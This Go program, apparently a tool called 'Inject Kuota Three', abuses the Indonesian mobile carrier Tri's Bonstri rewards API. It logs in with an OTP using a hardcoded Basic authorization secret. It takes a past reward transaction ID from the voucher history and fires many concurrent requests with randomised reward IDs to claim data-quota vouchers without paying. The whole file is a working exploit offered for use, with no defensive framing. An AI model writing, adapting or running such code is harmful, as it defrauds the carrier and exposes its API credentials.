package main

import (
	"bufio"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func strpos(haystack string, needle string) bool {
	if strings.Index(haystack, needle) != -1 {
		return true
	} else {
		return false
	}
}

func randomInt(min, max int) int {
	return min + rand.Intn(max-min)
}

func main() {
	var client = &http.Client{}
	var trxid string
	question := bufio.NewScanner(os.Stdin)
	rand.Seed(time.Now().UnixNano())

	fmt.Println("[+] Inject Kuota Three (1D 01-12)")
	fmt.Print("[+] Nomer HP: ")
	question.Scan()
	nomer := question.Text()
	login, err := http.NewRequest("POST", "http://bonstri.tri.co.id/api/v1/login/request-otp", strings.NewReader(`{"msisdn":"`+nomer+`"}`))
	check(err)
	login.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36")
	login.Header.Set("Content-Type", "application/json")
	login.Header.Set("Connection", "close")
	res, err := client.Do(login)
	check(err)
	defer res.Body.Close()
	respData, err := ioutil.ReadAll(res.Body)
	respString := string(respData)
	if strpos(respString, `"status":true`) {
		fmt.Print("[+] OTP: ")
		question.Scan()
		otp := question.Text()
		verif, err := http.NewRequest("POST", "http://bonstri.tri.co.id/api/v1/login/validate-otp", strings.NewReader("grant_type=password&username="+nomer+"&password="+otp))
		check(err)
		verif.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36")
		verif.Header.Set("Accept", "application/json, text/plain, */*")
		verif.Header.Set("Authorization", "Basic Ym9uc3RyaTpib25zdHJpc2VjcmV0")
		verif.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		rez, err := client.Do(verif)
		check(err)
		defer rez.Body.Close()
		rezpData, err := ioutil.ReadAll(rez.Body)
		rezpString := string(rezpData)
		if strpos(rezpString, `"access_token"`) {
			json.NewDecoder(rez.Body)
			keyVal := make(map[string]string)
			json.Unmarshal(rezpData, &keyVal)
			token := keyVal["access_token"]
			gas, err := http.NewRequest("POST", "http://bonstri.tri.co.id/api/v1/voucherku/voucher-history", strings.NewReader("{}"))
			check(err)
			gas.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36")
			gas.Header.Set("Accept", "application/json, text/plain, */*")
			gas.Header.Set("Authorization", "Bearer "+token)
			gas.Header.Set("Content-Type", "application/json")
			gaz, err := client.Do(gas)
			check(err)
			defer gaz.Body.Close()
			gazData, err := ioutil.ReadAll(gaz.Body)
			gazString := string(gazData)
			if strpos(gazString, "GB 1 Hari (Jam 01:00 - 12:00)") {
				trx := strings.Split(gazString, `GB 1 Hari (Jam 01:00 - 12:00)","rewardTransactionId":"`)
				trz := strings.Split(trx[1], `","`)
				trxid = trz[0]
				fmt.Print("[+] Tembak Berapa: ")
				question.Scan()
				qty, _ := strconv.Atoi(question.Text())
				var wg sync.WaitGroup
				wg.Add(qty)
				for i := 0; i < qty; i++ {
					go func(i int) {
						defer wg.Done()
						xyz := strconv.Itoa(randomInt(100, 999))
						pol, err := http.NewRequest("POST", "http://bonstri.tri.co.id/api/v1/voucherku/get-voucher-code", strings.NewReader(`{"rewardId":"2311180`+xyz+`","rewardTransactionId":"`+trxid+`"}`))
						check(err)
						pol.Header.Set("User-Agent", "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/67.0.3396.87 Mobile Safari/537.36")
						pol.Header.Set("Accept", "application/json, text/plain, */*")
						pol.Header.Set("Authorization", "Bearer "+token)
						pol.Header.Set("Content-Type", "application/json")
						pols, err := client.Do(pol)
						check(err)
						defer pols.Body.Close()
						polData, err := ioutil.ReadAll(pols.Body)
						polString := string(polData)
						fmt.Println("[+]", polString)
					}(i)
				}
				wg.Wait()
			} else {
				fmt.Println("Tidak ada riwayat transaksi pembelian kuota menggunakan poin tri!")
				os.Exit(1)
			}
		} else {
			fmt.Println(rezpString)
			os.Exit(1)
		}
	} else {
		fmt.Println(respString)
		os.Exit(1)
	}
}
